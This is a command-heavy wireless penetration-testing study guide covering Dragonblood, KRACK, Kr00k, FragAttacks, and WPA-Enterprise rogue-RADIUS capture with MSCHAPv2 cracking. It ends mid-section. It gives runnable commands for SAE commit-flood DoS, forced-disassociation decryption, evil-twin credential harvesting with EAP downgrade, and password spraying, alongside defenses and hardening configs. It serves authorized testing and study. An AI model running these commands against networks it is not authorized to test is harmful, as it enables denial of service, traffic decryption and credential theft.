# Theme: Advanced Protocol Attacks & Enterprise — Command-First Synthesis

> **Scope / authorization.** AUTHORIZED work only — your own gear, a lab you control,
> sanctioned CTF, written-RoE engagements, OSWP/OSCP study. Every attack here is paired
> with its **defense**; the deliverable is the hardening, not a trophy. For evil-twin /
> rogue-RADIUS / credential-phishing cover this file stays at **detection + concept** —
> it does **not** build a credential-harvesting portal. Point active tools only at a
> BSSID/client on your allowlist. Rogue RADIUS / evil-twin / deauth against networks you
> are not authorized to test is a crime (US CFAA, UK CMA, EU equivalents).
>
> **Lab:** Mac (hashcat on Metal GPU) + Kali (VM @ 192.168.64.2) + TP-Link **RTL8188EUS**
> (2.4 GHz-only, `8188eu`/`rtl8xxxu`). Capture on Kali, **crack on the Mac GPU**.

This theme merges five areas an operator meets once WPA2-PSK handshake-cracking is off the
table: **WPA3-SAE/Dragonblood**, **KRACK**, **Kr00k**, **FragAttacks**, and
**WPA-Enterprise/802.1X EAP → MSCHAPv2 cracking**. They split into two jobs:

- **Protocol/implementation bugs** (SAE, KRACK, Kr00k, FragAttacks) → mostly *patch-state
  verification + hardening*. None recovers the PSK; several need an on-path/MitM position.
- **Enterprise EAP** → the one place in this theme with a classic *capture-and-crack* win,
  and it hinges entirely on whether the client validates the RADIUS server certificate.

---

## 0. Master triage (what a pro decides first, mid-competition)

```
RECON the target's security mode (airodump AUTH column + iw RSN IE):
  PSK  (WPA2)        → not this theme (PMKID/4-way → hashcat -m 22000)
  SAE  (WPA3-only)   → §1. Offline crack INFEASIBLE. Do posture assessment.
  SAE PSK (transition)→ §1. Attack the WPA2 side (the real win). -m 22000.
  MGT  (Enterprise)  → §4. Identify EAP method → rogue RADIUS → crack MSCHAPv2 (§5).

Independent of mode, these are PATCH-STATE / MitM capabilities (own gear):
  KRACK        → §2. "Is my fleet patched? can an on-path attacker decrypt client traffic?"
  Kr00k        → §3a. Broadcom/Cypress FullMAC, 2.4 GHz WPA2-CCMP: buffered-data decrypt.
  FragAttacks  → §3b. Injection/exfil, WEP→WPA3, auth-method-agnostic.
```

**The two levers that collapse whole classes:** (1) **transition mode OFF / WPA3-only +
PMF required** kills the WPA3 downgrade class; (2) **supplicant validates the RADIUS
server cert (right CA + right server name, no user prompt)** kills the entire Enterprise
EAP class. Everything below is how to prove those levers are off — and report when they hold.

---

## 1. WPA3-SAE (Dragonfly) & Dragonblood

**Honest headline:** a correctly deployed **WPA3-Personal (SAE) network is not
offline-crackable.** There is **no hashcat mode for a WPA3-SAE PSK.** Any "WPA3 crack"
with `-m 22000` is attacking the **WPA2 side of a transition-mode network**. SAE
(Simultaneous Authentication of Equals, a Dragonfly PAKE) derives the PMK per-session, so
a captured exchange yields nothing testable offline — guessing is **online-only**,
rate-limited, and **PMF is mandatory** so forged deauth can't force re-handshakes.

**Dragonblood (Vanhoef & Ronen, 2019)** = implementation + transition-design weaknesses,
*not* "WPA3 cracked." Verified map:

| # | Attack | Tracking | Reality on a modern target |
|---|--------|----------|----------------------------|
| 1 | Cache side-channel, H&P hash-to-curve (ECC grp 19) | **CVE-2019-9494** | needs code on victim device (FLUSH+RELOAD); not RF-only; patched by H2E |
| 2 | Timing side-channel, H&P (MODP 22/23/24) | **CVE-2019-9494** | those groups **off by default** → usually dead end |
| 3 | Brainpool timing leak | **CVE-2019-13377** | rare; fix = don't use Brainpool |
| 4 | Password partitioning (turn leaks into dict split) | *Dragonforce* | only as strong as the leak feeding it |
| 5 | **Transition-mode downgrade → WPA2** | **CERT VU#871675** | **the realistic win** → offline dict on the WPA2 handshake |
| 6 | SAE security-group downgrade | **CERT VU#871675** | mitigated by downgrade protection; **still incomplete in 2.10** |
| 7 | DoS — flood forged SAE commit frames | **CERT VU#871675** | modest rate can overload AP; anti-clogging bypassable |

**2024 follow-up you MUST know (don't report "fixed in 2019"):** hostapd/wpa_supplicant
**2.10** mishandle the *Rejected Groups* element even with **H2E enabled** → group can be
forced down to another enabled group (**w1.fi 2024-2**). Conditions: `CONFIG_SAE=y`; H2E on
(`sae_pwe`=1 or 2); `sae_groups` lists **>1** group. hostapd defaults to a single group
(AP exposed only if reconfigured); **wpa_supplicant defaults to 19,20,21** (client exposed
out of the box). **Fix: 2.11+.** Also current: **SSID Confusion (CVE-2023-52424)** — always
fingerprint the hostapd/wpa_supplicant/iwd **version**, not just "is it WPA3."

**EAP-pwd (same Dragonfly, Enterprise-adjacent):** CVE-2019-9495/9497 (cache/reflection,
hostapd+wpa_supplicant), 9498/9499 (invalid-curve → server/client impersonation),
11234/11235 (FreeRADIUS reflection/invalid-curve), 13456 (FreeRADIUS iteration-count leak);
tool **Dragonslayer** (attacker needs only a valid username).

### Recon — identify EXACTLY what you face (decides everything)

```bash
# Monitor mode (RTL8188EUS = 2.4 GHz only)
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # -> wlan0mon

# Survey: airodump AUTH column — PSK=WPA2, SAE=WPA3, "SAE PSK"=TRANSITION (soft target)
sudo airodump-ng wlan0mon --band bg

# Decode the RSN IE precisely (AKM suite selector tells the truth):
sudo iw dev wlan0 scan | grep -A25 'SSID: TARGET_SSID'
#   Authentication suites: PSK         -> 00-0F-AC:2  = WPA2-PSK
#   Authentication suites: SAE         -> 00-0F-AC:8  = WPA3-SAE
#   Authentication suites: FT/SAE      -> 00-0F-AC:9  = FT-SAE (roaming)
#   00-0f-ac:24                        = SAE-EXT-KEY (H2E-capable)
#   Capabilities: ... MFPR (required)/MFPC (capable)  -> PMF state (MFPR set = real WPA3)

# One-liner: flag transition APs (both PSK AND SAE present = downgrade surface)
sudo iw dev wlan0 scan | awk '/SSID:/{s=$2} /Authentication suites:/{print s": "$0}'

# hcxdumptool can SEE SAE but CANNOT crack it (no 22000 hash is emitted for pure SAE)
sudo hcxdumptool -i wlan0 -w lab.pcapng -F --rds=1
hcxpcapngtool -o lab.22000 --all lab.pcapng     # WPA2 APs -> PMKID/EAPOL; pure SAE -> no hash
```

### Decision order

```
1. RECON: SAE? transition or WPA3-only? PMF required? groups? 6GHz? firmware version?
2. TRANSITION present (WPA2+WPA3)? → attack the WPA2 side (the only realistic offline win):
     hcxdumptool -> hcxpcapngtool -> hashcat -m 22000   (PMKID or 4-way on a WPA2 client)
     transition-downgrade: a WPA2-only clone (same password space) — YOUR OWN gear only.
3. WPA3-ONLY → offline crack INFEASIBLE. Evaluate in order:
     a) firmware < 2.11? sae_pwe=0? Dragonblood-era / 2024-2 / SSID-confusion exposure?
     b) weak groups (22/23/24/Brainpool) enabled? (rare)
     c) client-side cache side-channel (needs code on client — note as client-hardening)
     d) DoS resilience test (dragondrain) — AUTHORIZED, Atheros NIC only
     e) online guessing: rate-limited + PMF blocks deauth → not viable
4. DOCUMENT: "Pure SAE could not be offline-cracked" is a POSITIVE finding.
```

### The WPA2-side crack path (transition targets) — your real path

```bash
sudo hcxdumptool -i wlan0 -w cap.pcapng -F
hcxpcapngtool -o target.22000 cap.pcapng                       # 22000 replaces old 2500/16800
hashcat -m 22000 target.22000 wordlist.txt -r rules/best64.rule -w 3
hashcat -m 22000 target.22000 -a 3 ?d?d?d?d?d?d?d?d            # mask for known-pattern PSKs
```

### DoS / timing PoCs (YOUR AP only) — **Atheros-only, NOT the RTL8188EUS**

dragondrain/dragontime need the card to ACK frames to spoofed MACs via the `ath_masker`
kernel module — implemented only for **Atheros** (AWUS036NHA / WN722N **v1**; **v2 not
compatible**). The RTL8188EUS is your capture/monitor/injection NIC, not for these.

```bash
# build (Kali): autoreconf -i && ./configure && make  (deps: autoconf automake libtool shtool libssl-dev pkg-config)
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -b 54 -n 20 -r 200   # 20 spoofed MACs
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -b 54 -n 20 -r 40 -g 21  # P-521 costs AP more
./dragontime  -d wlan0 -c 1 -a 11:22:33:44:55:66 -g 27 -i 250 -t 750 -o measurements.txt
#   -g group (19=P-256, 21=P-521)  -n #spoofed MACs  -r handshakes/sec  -M queue-defense (exp)
# dragonforce: consumes the timing/cache measurements → password partitioning (only as good as the leak)
```

**Interpreting dragondrain:** anti-clogging is bypassed when forged-handshakes/sec stays
high while AC-tokens-received ≈ 0. Single-MAC run only bypasses anti-clogging if you wait a
few minutes after a prior run (hostapd still tracks old handshakes).

### Gotchas

- **No hashcat mode for WPA3-SAE PSK.** Captured SAE ≠ crackable hash. **PMKID attack does
  not apply to SAE.**
- **PMF mandatory in WPA3** → `aireplay-ng --deauth` / mdk4 deauth rejected on WPA3-only.
  (On *transition* APs the WPA2 clients may still be deauthable — that's the opening.)
- **Timing needs MODP 22/23/24** = off by default. **NIST curves leak no timing** in H&P
  (group-19 exposure was the *cache* attack, needs code on victim).
- **6 GHz forces H2E** (hostapd auto-sets `sae_pwe=2`) → H&P timing/cache class closed there.
- **"Patched in 2019" is wrong** — group-downgrade incomplete in 2.10; SSID Confusion is 2023.
- **RTL8188EUS is 2.4 GHz only** — many WPA3/6 GHz nets won't even be visible; note the limit.

### Defense

| Threat | Defense |
|--------|---------|
| Transition downgrade → WPA2 (#5) | **Disable transition; run WPA3-only** + PMF required. Removes the WPA2 handshake entirely. |
| SAE group downgrade (#6) | **hostapd/wpa_supplicant 2.11+**; prefer a **single group** `sae_groups=19`. |
| H&P cache/timing (#1–3) | **Enable H2E** (`sae_pwe=2` compat, or `=1` H2E-only). Drop MODP 1/2/5/22/23/24 + Brainpool. ≥2.8 constant-time build. |
| Password partitioning (#4) | High-entropy passphrase — a residual leak can't brute a strong space. |
| Commit-flood DoS (#7) | Low-priority commit processing; anti-clogging tokens; patch; WIDS alert on commit floods. |
| Forged deauth/mgmt | **PMF required** (`ieee80211w=2`, `sae_require_mfp=1`). |
| Public/open impersonation | **SAE-PK** (clients verify AP public key). OWE encrypts but does **not** authenticate the AP — not evil-twin protection. |

```ini
# Hardened hostapd (reference)
wpa=2
wpa_key_mgmt=SAE            # SAE only (no WPA2 fallback = no transition)
rsn_pairwise=CCMP
ieee80211w=2               # PMF REQUIRED
sae_require_mfp=1
sae_pwe=1                  # H2E only (use 2 if some clients need H&P). 0=H&P, 1=H2E, 2=both
sae_groups=19             # NIST P-256 only (single group also dodges 2024-2); keep hostapd >= 2.11
```

---

## 2. KRACK — Key Reinstallation Attack (WPA/WPA2 handshakes)

**Not a password attack.** KRACK (Vanhoef & Piessens, CCS 2017) tricks a victim into
**reinstalling an already-in-use key**, which **resets the nonce (TX packet number) and RX
replay counter** → keystream reuse → **decrypt, replay, and (per cipher) forge**. The flaw
is in the **802.11 standard**, so every correct WPA2 impl was affected. It **does not
recover the PSK or the session key.** In this toolkit it is a **patch-state verification +
detection** capability, run against **your own** gear.

**Severe variant (Linux/Android):** `wpa_supplicant` **2.4/2.5** clear the TK from memory
after install, then reinstall it as **all-zeros** on a retransmitted Msg3 → trivial decrypt
+ inject. **2.6** is vulnerable via a forged/retransmitted **Msg1** reusing the ANonce
(the `--tptk` path).

**Cipher impact:** AES-CCMP = decrypt+replay (no practical arbitrary forgery demoed); TKIP =
+Michael MIC key → forge one direction; **GCMP = leaks GHASH key → forge both directions**;
all-zero key = full decrypt+inject.

**CVE family (memorize — OSWP/interview fodder):**

| CVE | Reinstalled key | Handshake | Side |
|---|---|---|---|
| **13077** | PTK-TK | 4-way | client |
| 13078 / 13079 | GTK / IGTK | 4-way | client |
| 13080 / 13081 | GTK / IGTK | Group Key | client |
| **13082** | PTK-TK | **FT / 802.11r** Reassoc | **AP (no MitM, no Msg4 race)** |
| 13084 | STK | PeerKey (N/A — install "does not work") | — |
| 13086 / 13087 / 13088 | TK / GTK / IGTK | TDLS / WNM Sleep | client |

**CVE-2017-13082 (FT/802.11r) is the lab favourite:** AP-side, **no MitM, no blocked Msg4**
— just **replay** the FT Reassociation Request; exactly what `krack-ft-test.py` exercises.
The 4-way case needs a **channel-based MitM** (two radios: one to the AP, one to the client,
herd the client with a CSA, drop Msg4). **2018 follow-up:** power-save buffering removes the
race and beat several first-round patches — **trust the behaviour, not the version string.**

### Build + test (official Vanhoef scripts — *test* tools, need your own creds)

```bash
sudo apt install -y libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python3-venv iw
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts/krackattack
./build.sh && ./pysetup.sh

# CRITICAL: disable hardware crypto or results are silently wrong
sudo ./disable-hwcrypto.sh && sudo reboot      # verify: systool -vm <module> (e.g. ath9k_htc)

# per session
sudo rfkill unblock wifi
sudo su; source venv/bin/activate               # edit hostapd/hostapd.conf: interface=wlan0
# client under test joins SSID 'testnetwork' / pass 'abcdefgh', must get a DHCP lease
```

### Client tests — run in THIS order

```bash
./krack-test-client.py --replay-broadcast   # 1) MUST be clean first or --group false-positives
./krack-test-client.py --group --gtkinit    # 2) group-key install (RSC)
./krack-test-client.py --group              # 3) group-key REINSTALL (CVE-2017-13080)
./krack-test-client.py                      # 4) THE MAIN TEST: 4-way PTK/TK reinstall (13077/13078)
#      in another shell:  ping 192.168.100.254   (generate unicast so IV reuse is observable)
./krack-test-client.py --tptk               # 5) forged Msg1 → 2.6 all-zero-key path
./krack-test-client.py --tptk-rand          # 6) forged Msg1 with RANDOM ANonce
./krack-test-client.py --gtkinit            # 7) new group keys + high replay counters
```

**Test 4 is the single most important check.** "vulnerable" verdict on 4 or `--group` =
device reinstalled the key.

### AP / FT test (CVE-2017-13082) — needs real 802.11r + a 2nd AP to roam to

```bash
cat > network.conf <<'EOF'
ctrl_interface=/var/run/wpa_supplicant
network={ ssid="testnet" key_mgmt=FT-PSK psk="password" }
EOF
sudo su; source venv/bin/activate
./krack-ft-test.py wpa_supplicant -D nl80211 -i wlan0 -c network.conf
wpa_cli -i wlan0        # > scan_results ; > roam <bssid-of-second-AP>
arping -I wlan0 192.168.1.10
#   VULNERABLE: "IV reuse detected (IV=X, seq=Y). AP is vulnerable!"
#   PATCHED:    IVs keep incrementing despite the replays
```

### Independent confirmation (monitor mode + Wireshark)

```bash
sudo airodump-ng -c <chan> --bssid <AP-MAC> -w krack_verify wlan1mon
# filters: eapol (duplicate Msg3) ; wlan.ccmp.extiv (CCMP IV reset/repeat = KRACK signature)
#          wlan.fc.type_subtype==0x28 (QoS data) → repeated CCMP PN after handshake = nonce reuse
```

### Detection (blue team, own net)

`securingsam/krackdetector` (monitor-mode WIDS): detects a duplicate/retransmitted Msg3 and
deauths the client to break the attack. **False positives** — Msg3 is legitimately
retransmitted when Msg4 is lost. Alerting layer, **not a fix**.

### Gotchas

- **Does NOT get the password.** Changing the Wi-Fi password does **not** mitigate KRACK.
- **Hardware crypto OFF** on the test AP or results are silently wrong.
- `--replay-broadcast` must be clean before trusting `--group`. **Packet loss ruins
  verdicts** → low-noise RF, close range, repeat runs. Some clients can't be tested (never
  accept a retransmitted Msg3) — not the same as "patched."
- **Patched ≠ immune (2018)** — re-test after patching.

### Defense

Patch **BOTH** client and AP (client is the important side); patches are backwards-compatible.
Maintainer fixes (w1.fi/security/2017-1): "Prevent reinstallation of an already in-use group
key," "Prevent installation of an all-zero TK"; hostapd "Avoid key reinstallation in FT
handshake" + "Fix PTK rekeying to generate a new ANonce." **Update to 2.7+.** Interim AP
mitigations (not cures): disable EAPOL retransmission (breaks if TDLS used), disable
client/repeater mode, disable 802.11r. **PMF** raises the bar for the mgmt-frame side but
does **not** by itself stop the data-plane 4-way reinstall. Move to **WPA3-SAE** (mandates
PMF; SAE not vulnerable to 4-way reinstall) — but transition mode reopens WPA2 fallback.
Defense-in-depth: HTTPS/HSTS/VPN; segment unpatchable IoT.

---

## 3. Kr00k & FragAttacks — chipset / standard bugs (patch-state + hardening)

Both are *chipset/firmware/driver/standard* problems. **Inventory the silicon first.** The
official tools require the network's credentials → they are **patch-test harnesses**, not
break-in tools. **Retry every timeout — both tools under-report.**

### 3a. Kr00k — CVE-2019-15126 (ESET, 2020)

When a vulnerable **Broadcom/Cypress FullMAC** chip is **disassociated**, it clears the TK
to all-zeros but still **transmits frames already in its TX buffer** encrypted under that
all-zero key → anyone in range decrypts them. **Not** a PMK/password compromise — only the
few KB buffered at disassoc leak. Disassoc is cheap and can be **forced** (deauth/disassoc
spray), so the attack is *loop: disassoc → flush → decrypt → repeat*. ESET est. **1B+
devices** (iPhone/iPad/Mac, many Androids, Echo, Kindle, Pi 3, Asus/Huawei APs).
**Beyond-Kr00k:** Qualcomm **CVE-2020-3702** and MediaTek flush **cleartext** (Protected bit
set, no encryption at all). **Realtek NOT implicated** — your RTL8188EUS is the *testing
radio*, not a target class. **2.4 GHz + WPA2-AES-CCMP only** for the PoC.

```bash
# Ground truth: ESET's official script (covers Kr00k + Beyond-Kr00k variants)
git clone https://github.com/eset/malware-research.git   # read kr00k/ README for invocation

# Watch the decrypt happen: akabe1/kr00ker
pip3 install scapy pycryptodomex          # Cryptodome, NOT old pycrypto
git clone https://github.com/akabe1/kr00ker.git && cd kr00ker
# iface in monitor mode (lock to AP channel), run as root:
sudo python3 kr00ker.py -i wlan0mon -b <BSSID> -c <client-MAC> -n 5 -r 3 -t client -w 2 -d 2
sudo python3 kr00ker.py -i wlan0mon -b <BSSID> -c <client-MAC> -t ap -w 11   # README defaults
#   -n disassoc count  -r reason  -t client|ap  -w channel  -d delay
```

**Success signal:** decrypted LLC/SNAP payload **begins with `\xaa\xaa\x03\x00\x00\x00`**
(RFC1042 SNAP header); tool hexdumps + writes a pcap. Garbage = TK wasn't all-zero → likely
patched. **Fill the buffer first** (stream/large download on the target) then flush; loop
`-n` with short `-d`. **Empty/short capture ≠ patched** (under-buffering false negatives).

### 3b. FragAttacks — 12 CVEs (Vanhoef, USENIX Sec '21)

802.11 fragmentation + A-MSDU aggregation flaws → **packet injection**, and under conditions
**exfiltration**. Affect **all protected Wi-Fi WEP→WPA3**; 75+ devices tested, all vulnerable
to ≥1 variant. **Auth-method-agnostic** (WPA2-PSK / WPA3-SAE / EAP-TLS behave identically —
bugs live below the key exchange). **Three design CVEs** hit basically everything — test
first: **24588** (aggregation / unauthenticated is-aggregated flag), **24587** (mixed-key:
reassemble fragments under different keys), **24586** (fragment cache not cleared on
(re)connect). Nine impl CVEs (26139–26147) are the *trivial-to-exploit* ones on sloppy stacks
(plaintext accept, cloaked EAPOL A-MSDU, non-consecutive PN, etc.). Injection buys: **rogue
DNS via ICMPv6 RA** (nearly all devices), **NAT/firewall hole-punch** (TCP SYN with internal
src → stepping stone, popped Windows 7), **IoT control**.

**Card reality:** RTL8188EUS is fine for Kr00k but **not** FragAttacks mixed mode. Use **Alfa
AWUS036ACM (mt76)** — *the* recommended card. AWUS036ACH = no mixed mode (`--no-drivercheck
--inject`). **AX200 = incompatible** (firmware crashes on More-Fragments). ath9k_htc needs
patched firmware. **Kernel ≤ 5.12** (reference Ubuntu 20.04/5.8); **20 MHz channel**.

```bash
git clone https://github.com/vanhoefm/fragattacks.git && cd fragattacks/research
./build.sh && ./pysetup.sh            # rebuild after EVERY git pull
# mixed-mode needs patched drivers from vanhoefm/fragattacks-drivers58 (make defconfig-wifi; make install; reboot)
cat /sys/module/mac80211/parameters/fragattack_version   # exists only if patched driver is live

# per session
sudo su; source venv/bin/activate
./droptraffic.sh                      # block host's own traffic so it won't pollute tests

# PROVE INJECTION FIRST (never skip — a dishonest card = meaningless "secure" results)
./fragattack.py wlan0 ping --inject-test wlan1
./test-injection.py wlan0 wlan1

# modes: MIXED (1 card, patched drv) | INJECTION (2 cards) | test YOUR AP = no --ap / YOUR CLIENT = --ap
./fragattack.py wlan0 [--ap] $COMMAND
```

Core test matrix (exact `$COMMAND`s):

```bash
# sanity (MUST pass)
./fragattack.py wlan0 ping
./fragattack.py wlan0 ping I,E,E                 # if it fails: --icmp-size 100 (then pass to ALL tests)
./fragattack.py wlan0 ping-frag-sep              # if THIS fails, mixed-key & cache will too (predictor)
# A-MSDU design flaw (CVE-2020-24588)
./fragattack.py wlan0 ping I,E --amsdu
./fragattack.py wlan0 amsdu-inject
# mixed-key design flaw (CVE-2020-24587) — vs AP add --rekey-req if it won't rekey
./fragattack.py wlan0 ping I,F,BE,AE
# fragment-cache design flaw (CVE-2020-24586)
./fragattack.py wlan0 ping I,E,R,AE
./fragattack.py wlan0 ping I,E,R,AE --full-recon  # deauth (not disassoc) on reconnect
# plaintext-accept / mixed (26147/26140/26143)
./fragattack.py wlan0 ping I,E,P ; ./fragattack.py wlan0 ping I,P ; ./fragattack.py wlan0 linux-plain
# non-consecutive PN (26146) ; broadcast plaintext frag (26145) ; cloaked EAPOL A-MSDU (26144)
./fragattack.py wlan0 ping I,E,E --inc-pn 2
./fragattack.py wlan0 ping I,D,P --bcast-ra
./fragattack.py wlan0 eapol-amsdu I,P
```

**Action grammar for `I,F,BE,AE`:** `I`=get IP, `E`=encrypted frag, `P`=plaintext frag,
`F`=force rekey, `R`=reconnect, `D`=decoy (not sent). Timing prefixes `S`/`B`/`A`/`C` =
during msg1-2 / before install / after handshake / 1s after connect. So `I,E,R,AE` =
cache-poison sequence; `I,F,BE,AE` = mixed-key sequence.

**Interpreting:** **`TEST COMPLETED SUCCESSFULLY`** = vulnerable. **`Test timed out! Retry
to be sure`** = likely-not — **retry before concluding.** `BP`/broadcast/`eapol-amsdu BP`
tests **can't self-confirm** — sniff the **victim** with tcpdump/Wireshark from **managed/AP
mode (not monitor)**, filter `frame contains "test_ping_icmp"`. A "secure" result can be a
lie (card silently rewrites seq/frag numbers).

### Gotchas (both)

- **PMF does NOT fix Kr00k** (zero-key flush happens on *any* disassoc; PMF only makes
  forcing it harder — friction, not a cure).
- **Fragment timeout ≈ 2 s on Linux** → keep FragAttacks `--delay ≤ 1.5` or tests fail
  trivially and masquerade as "patched." Disable power-save on the device under test.
- **Intel cards send Block-Ack between fragments** → spurious negatives.
- Prove injection honest both ways (`aireplay-ng --test wlan0mon` for Kr00k).

### Defense

- **Kr00k:** firmware/OS update is the **only** real fix (Cisco Meraki: no mitigation exists).
  Ride E2E encryption (TLS/VPN/SSH stay safe on an unpatched radio). Reduce forced disassocs
  with PMF (friction). Retire never-patched chips (BCM4329) or VLAN-segment them.
- **FragAttacks:** patch drivers/firmware/OS/AP. **HTTPS + HSTS** → "transmitted data cannot
  be stolen"; VPN blunts exfil **but not the direct device attacks** (NAT hole-punch / IoT).
  **Biggest myth to correct in your notes: neither 802.11w/PMF nor EAP-TLS stops FragAttacks.**
  Harden what injection is *for*: host firewalls on, **pinned DNS / DoH-DoT** (block injected
  ICMPv6 RA), segment IoT, patch LAN hosts. Re-run the matrix after each patch (PASS→FAIL).

---

## 4. WPA-Enterprise / 802.1X / EAP — capture the inner credential

Enterprise shows **AUTH = MGT** in airodump. The AP is a **dumb relay**; real auth is an
**EAP** conversation tunneled between supplicant and the **RADIUS** server. The attacker
sees only what the EAP method leaks.

| EAP method | What leaks if you impersonate RADIUS |
|---|---|
| **PEAP-MSCHAPv2** | username (cleartext Phase 1) + MSCHAPv2 **challenge/response** → offline crack |
| **EAP-TTLS/PAP** | username + **cleartext password** (inside tunnel) — highest-value, no cracking |
| EAP-TTLS/MSCHAPv2 | challenge/response → offline crack |
| **EAP-GTC** | **cleartext password** (the downgrade target) |
| EAP-MD5 / LEAP | challenge/response on open air (no tunnel) → `eapmd5pass` / `asleap` |
| **EAP-TLS** | **nothing** — client cert required; immune to this class |

**The one weakness everything exploits:** the TLS tunnel protects the inner credential
**only if the supplicant validates the RADIUS server cert (correct CA + correct server
name).** If it doesn't (or the user clicks through a warning), a rogue AP + fake RADIUS
terminates the tunnel itself and receives the inner MSCHAPv2. **Server-cert validation is
the only thing between a client and a rogue RADIUS.** EAP-TLS is immune (client cert the
attacker can't produce).

### Lab prereqs

RTL8188EUS must support **AP/master mode** (`iw list` → `* AP`; some `8188eu` builds flake
as AP — set `driver=nl80211`). Kali: `hostapd-wpe eaphammer asleap eapmd5pass hashcat
hcxtools wpa_supplicant freeradius`. `sudo airmon-ng check kill; sudo rfkill unblock wifi`.

### Recon — confirm Enterprise, ID the EAP method, harvest usernames

```bash
sudo airodump-ng wlan0mon --band bg                        # ENC=WPA2 CIPHER=CCMP AUTH=MGT = Enterprise
sudo airodump-ng -c <ch> --bssid <AP_BSSID> -w ent-recon wlan0mon

# EAP Response/Identity (username/realm) is CLEARTEXT in Phase 1, before the tunnel:
sudo tcpdump -i wlan0mon -w eap.pcap 'ether proto 0x888e'
sudo tshark -i wlan0mon -Y eap -T fields -e wlan.sa -e eap.identity -e eap.type
#   eap.type: 1=Identity 3=NAK 4=MD5 6=GTC 13=TLS 17=LEAP 21=TTLS 25=PEAP 43=FAST 52=PWD
eapmd5pass -r eap.pcap -w /usr/share/wordlists/rockyou.txt  # if EAP-MD5 offered: crack directly, no rogue AP
```

### Decision tree

```
Confirm MGT → sniff ONE real auth → username/realm + offered EAP method
  EAP-TLS only? → STOP. Client cert required. Report as a STRENGTH.
  Weak/known passwords + have usernames? → air-hammer ONLINE SPRAY (no rogue AP) — lockout-risky
  EAP-MD5 offered? → eapmd5pass on the pcap, no rogue AP
  Else → evil-twin + fake RADIUS (eaphammer --creds, default negotiation):
       client validates cert → won't complete = DEFENSE WORKING (a finding, not a failure)
       TTLS/PAP or GTC-tolerant → CLEARTEXT password, no cracking
       PEAP/TTLS-MSCHAPv2 → capture challenge/response → crack (§5)
```

### Path A — hostapd-wpe (classic, OSWP-standard)

```bash
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf      # set interface/ssid/channel; certs pre-wired
sudo airmon-ng check kill
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
#   -s stdout  -c Cupid (Heartbleed CVE-2014-0160 vs vulnerable supplicant TLS)  -k Karma
```
Minimal conf keys: `interface=wlan0  driver=nl80211  ssid=CorpWifi  channel=6  hw_mode=g
wpa=2  wpa_key_mgmt=WPA-EAP  wpa_pairwise=CCMP  ieee8021x=1  eap_server=1`. Output (console +
`/root/hostapd-wpe.log`) prints `username / challenge (8B) / response (24B)` and a ready
`jtr NETNTLM: bob:$NETNTLM$<chal>$<resp>` line. TTLS/PAP prints the **cleartext password**.

### Path B — eaphammer (modern; auto-negotiates + GTC-downgrade)

```bash
./eaphammer --cert-wizard                       # one-time self-signed RADIUS cert (or --bootstrap)
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWifi --creds   # core credential-capture
#   loot/ gets John/hashcat-ready hashes; MSCHAPv2 capture succeeds regardless of password strength
./eaphammer -i wlan0 --essid CorpWifi -c 6 --auth wpa-eap --creds --autocrack   # internal (slow) cracker
```
`--negotiate`: `balanced` (default, GTC-first fallback) | `speed` | `weakest` (full
downgrade) | `gtc-downgrade` (PEAPv1+GTC only → cleartext if accepted) | `manual
--phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC` (mimic the real AP to avoid
suspicion). **GTC-downgrade is loud** — a client expecting MSCHAPv2 emits **EAP-NAK (type
3)**, and hardened iOS/macOS/Windows refuse — again a good finding. Try `balanced` first.

### Online spray — air-hammer (no evil twin)

```bash
air-hammer.py -i wlan0 -e CorpWifi -P passwords.txt -u users.txt   # one password across ALL users
#   ~1–5 s/attempt → slow + account-lockout-risky. Use 1–2 passwords max; respect lockout; RoE only.
```

### Hostile/captive portal — concept + DETECTION only

`eaphammer --hostile-portal` (→ SMB share + Responder for NetNTLM) / `--pivot` are
**network-layer** post-assoc techniques, RoE only. **Credential-phishing portals are NOT
built here.** A legitimate WPA-Enterprise join **never** needs a web form for the AD password
— that *is* the tell. Detect rogues: second BSSID on your ESSID, **wrong RADIUS cert
(issuer/thumbprint/server name)**, anomalous EAP offers (GTC where you deploy only PEAP), EAP-NAK
bursts, deauth floods preceding a new BSSID.

```bash
sudo airodump-ng wlan0mon --essid CorpWifi --band bg -w rogue-watch   # any BSSID != your APs = investigate
```

---

## 5. MSCHAPv2 cracking (the Enterprise payoff)

**Why it breaks — the one paragraph:**

```
NT-Hash  = MD4(UTF-16LE(password))                       # 16 bytes
padded   = NT-Hash || 00 00 00 00 00                     # 21 bytes
keys     = split(padded,7) -> K1 K2 K3                   # three DES keys
ChalHash = SHA1(PeerChallenge || AuthChallenge || Username)[0:8]
Response = DES(K1,ChalHash) || DES(K2,ChalHash) || DES(K3,ChalHash)   # 24 bytes
```

K3 = only **2 real bytes** + 5 nulls → **2^16**, instant (gives last 2 bytes of the NT hash).
K1+K2 = a **single DES-56** problem (same known plaintext) → **2^56**, guaranteed on FPGA in
≤~24 h **regardless of password strength** (Marlinspike & Ray, DEF CON 20, 2012). You crack
**DES, not MD4** → no password policy changes the result. Recovering the DES keys yields the
**full NT hash** (for AD that *is* the credential — pass-the-hash). **MSCHAPv2 response ==
NetNTLMv1** → **hashcat -m 5500** cracks it directly.

Two independent routes against the same capture:

| Route | Tool | Recovers | Strong password? |
|---|---|---|---|
| **Dictionary/mask** | `hashcat -m 5500`, `asleap` | plaintext | No — only if in wordlist/mask |
| **DES reduction** | `chapcrack` → crack.sh (or `-m 14000` local) | NT hash → PtH or `-m 1000` | **Yes — guaranteed** |

**You need per auth:** username (**exact case** — it's SHA1'd into ChalHash), the two 16-byte
challenges *or* the 8-byte ChallengeHash, and the 24-byte NT-Response. `hostapd-wpe`/`asleap`
compute the 8-byte ChallengeHash for you.

### Route A (preferred) — hashcat -m 5500

Field order: `USERNAME::DOMAIN:LMRESPONSE:NTRESPONSE:SERVERCHALLENGE`. For MSCHAPv2, LM + domain
empty → `labuser::::<24B-NTresp-hex>:<8B-challenge-hex>`.

```bash
# convert the hostapd-wpe jtr line to 5500:
echo 'bob:$NETNTLM$1a2b3c4d5e6f7a8b$aabbcc...' | sed -E 's/^(.*):\$NETNTLM\$(.*)\$(.*)$/\1::::\3:\2/'
